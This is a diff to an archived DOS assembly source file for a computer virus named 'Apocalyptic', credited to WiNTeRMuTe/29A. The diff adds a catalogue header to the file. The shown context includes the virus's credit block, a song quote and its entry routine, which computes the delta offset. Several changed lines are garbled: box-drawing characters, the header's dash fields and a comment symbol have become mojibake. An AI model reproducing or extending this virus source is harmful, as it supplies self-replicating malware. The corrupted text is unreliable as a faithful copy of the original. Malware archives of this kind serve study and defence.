@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       โ€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     โ€”
+; ------------------------------------------------------------
 ;   Virus name:     Apocalyptic
 ;   Author:         WiNTeRMuTe/29A
 ;   Size:           1058 bytes
@@ -34,7 +45,7 @@
 ;   - Some Fidoasses. They know who they are.
 ;
 ;
-;                  ฤอออออออออออออออออออออออออออออออออออฤ
+;                  ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ
 ;
 ;                  " Why don't you get a life and grow up,
 ;                why don't you realize that you're fucked up,
@@ -43,7 +54,7 @@
 ;
 ;                              ( Sepultura )
 ;
-;                       ฤอออออออออออออออออออออออออฤ
+;                       ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ๏ฟฝ
 ;
 ;   To assemble the virus, use:
 ;
@@ -74,7 +85,7 @@ org     0h
 Letsrock:
                 call    delta                   ; Entry for Com/Exe
 delta:
-                mov     si,sp                   ; ๋-offset
+                mov     si,sp                   ; ๏ฟฝ-offset
                 mov     bp,word ptr ss:[si]
                 sub     bp,offset delta
                 push    es ax ds
